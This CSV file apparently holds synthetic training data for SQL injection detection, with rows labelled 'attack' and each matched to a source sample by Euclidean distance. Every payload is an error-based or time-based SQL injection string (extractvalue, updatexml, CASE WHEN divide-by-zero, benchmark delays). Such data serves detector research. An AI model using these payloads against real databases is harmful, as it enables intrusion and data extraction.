id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000259,attack,error, (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,nearest_attack_euclidean,R000043,7.37226989008388
CTGAN_000260,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,5.99926790597695
CTGAN_000261,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",nearest_attack_euclidean,R000025,8.572993858822551
CTGAN_000262,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000068,7.572558772982695
CTGAN_000263,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,7.192789990199312
CTGAN_000264,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000030,7.192675103144496
CTGAN_000265,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,6.9508864100298124
CTGAN_000266,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,8.478584977620207
CTGAN_000267,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000068,7.828143348035995
CTGAN_000268,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,9.186370737560376
CTGAN_000269,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000041,6.219275207580638
CTGAN_000270,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000058,7.422478503393842
CTGAN_000271,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,7.3266629749444805
CTGAN_000272,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000058,6.924727612449931
CTGAN_000273,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,5.886515933365081
CTGAN_000274,attack,error,select   (  case when   (  5704  =  4125  )   then 5704 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000050,6.342258461019093
CTGAN_000275,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",nearest_attack_euclidean,R000042,5.872273790007176
CTGAN_000276,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000068,6.755393526320536
CTGAN_000277,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,7.5497658649396495
CTGAN_000278,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000053,7.1747061920395545
CTGAN_000279,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",nearest_attack_euclidean,R000025,8.444375374234218
CTGAN_000280,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,6.806985433288109
CTGAN_000281,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,8.025220636483576
CTGAN_000282,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,6.489762889500228
CTGAN_000283,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,8.715303651817043
CTGAN_000284,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,4.958151972082765
CTGAN_000285,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,7.861184087197677
CTGAN_000286,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,6.740267351714144
CTGAN_000287,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,7.689734106687278
CTGAN_000288,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000049,8.251172766177394
CTGAN_000289,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,6.449266883702469
CTGAN_000290,attack,error,select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000048,6.583213472056995
CTGAN_000291,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,7.529305089258159
CTGAN_000292,attack,error,select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000078,6.480072891821543
CTGAN_000293,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,7.982007670594344
CTGAN_000294,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,7.940739510517001
CTGAN_000295,attack,error,select   (  case when   (  6166  =  3364  )   then 6166 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000048,8.83940882024638
CTGAN_000296,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,6.034218974334156
CTGAN_000297,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,7.4045060849876
CTGAN_000298,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",nearest_attack_euclidean,R000042,7.826846144196329
CTGAN_000299,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,5.546368893830574
CTGAN_000300,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000053,7.901569477840861
CTGAN_000301,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000053,9.024237415896973
CTGAN_000302,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,6.64150631531739
CTGAN_000303,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000058,9.416534852694657
CTGAN_000304,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000053,7.010809173179163
CTGAN_000305,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",nearest_attack_euclidean,R000025,8.588310514525872
CTGAN_000306,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000053,7.682397178899467
CTGAN_000307,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000068,9.624997559166319
CTGAN_000308,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,6.133482092162631
CTGAN_000309,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000053,7.55662639502795
CTGAN_000310,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,7.292189269946481
CTGAN_000311,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,6.945164068921566
CTGAN_000312,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",nearest_attack_euclidean,R000042,6.574216487448839
CTGAN_000313,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,6.798125859472831
CTGAN_000314,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,6.26590606650708
CTGAN_000315,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,8.373283243491365
CTGAN_000316,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,7.294252051695905
CTGAN_000317,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,6.634231145036338
CTGAN_000318,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",nearest_attack_euclidean,R000042,8.26841416472896
CTGAN_000319,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000068,8.096792023420257
CTGAN_000320,attack,error,select   (  case when   (  4415  =  2051  )   then 4415 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000054,7.749361553716954
CTGAN_000321,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,7.61795790837446
CTGAN_000322,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,6.997527709249855
CTGAN_000323,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,5.953870999593735
CTGAN_000324,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,7.666870711174669
CTGAN_000325,attack,error,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000018,9.637369670937602
CTGAN_000326,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,7.05084170291643
CTGAN_000327,attack,error,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",nearest_attack_euclidean,R000063,6.851624060237402
CTGAN_000328,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,7.5316684788381965
CTGAN_000329,attack,error,select   (  case when   (  5847  =  2826  )   then 5847 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000076,5.62305159080401
CTGAN_000330,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,6.873826878751059
CTGAN_000331,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,5.701922309787591
CTGAN_000332,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000041,7.8067621566833125
CTGAN_000333,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000056,7.012865692680274
CTGAN_000334,attack,error,select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000065,7.597798467553802
CTGAN_000335,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",nearest_attack_euclidean,R000042,7.4352471810127705
CTGAN_000336,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,5.44924112827658
CTGAN_000337,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,9.083162604629152
CTGAN_000338,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000068,6.339721694392053
CTGAN_000339,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000053,8.147377868554111
CTGAN_000340,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,6.119871666910623
CTGAN_000341,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000058,8.001550265902374
CTGAN_000342,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000058,6.849912091339391
CTGAN_000343,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,6.293579027418689
CTGAN_000344,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,9.137682746166904
CTGAN_000345,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,8.799583014065467
CTGAN_000346,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000058,5.571144655296935
CTGAN_000347,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000053,8.551653595722048
CTGAN_000348,attack,error, (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,nearest_attack_euclidean,R000043,6.328440229574744
CTGAN_000349,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000053,9.40175088000958
CTGAN_000350,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,8.483725738254666
CTGAN_000351,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,7.037562387643984
CTGAN_000352,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,6.696533025687286
CTGAN_000353,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",nearest_attack_euclidean,R000042,8.07661857567029
CTGAN_000354,attack,error,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000057,8.797355093835511
CTGAN_000355,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000068,5.8989491134043845
CTGAN_000356,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,7.945167798098185
CTGAN_000357,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,6.6495968981375775
CTGAN_000358,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,10.868170888129269
CTGAN_000359,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,6.371718035738763
CTGAN_000360,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000030,7.153633834704895
CTGAN_000361,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000058,7.010314853127857
CTGAN_000362,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,7.375004626370158
CTGAN_000363,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,9.567108813076368
CTGAN_000364,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,8.683918845011638
CTGAN_000365,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,8.646738615423375
CTGAN_000366,attack,error,select   (  case when   (  9393  =  5530  )   then 9393 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000030,5.532819845438171
CTGAN_000367,attack,error, (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,nearest_attack_euclidean,R000043,8.071068027930686
CTGAN_000368,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,7.14756828765935
CTGAN_000369,attack,error,select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000035,8.368727314946163
CTGAN_000370,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,7.45060822680189
CTGAN_000371,attack,error,select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000035,6.593994576869242
CTGAN_000372,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R000036,6.473744720851229
CTGAN_000373,attack,error,select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000058,11.339304995522191
CTGAN_000374,attack,error,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000070,8.013894945015387
CTGAN_000375,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000061,8.184877194460139
CTGAN_000376,attack,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000014,8.00610742092363
CTGAN_000377,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",nearest_attack_euclidean,R000025,6.119195663585758
CTGAN_000378,attack,error,"1' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000057,10.721174433411736
CTGAN_000379,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,5.57768323512867
CTGAN_000380,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",nearest_attack_euclidean,R000025,8.670054335244776
CTGAN_000381,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,6.45645330841884
CTGAN_000382,attack,error,select   (  case when   (  5847  =  2826  )   then 5847 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000076,7.778752252304301
CTGAN_000383,attack,error,select   (  case when   (  5423  =  7706  )   then 5423 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000044,5.9307050218723685
CTGAN_000384,attack,error,"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",nearest_attack_euclidean,R000033,10.368931969427564
CTGAN_000385,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",nearest_attack_euclidean,R000042,8.186381909433402
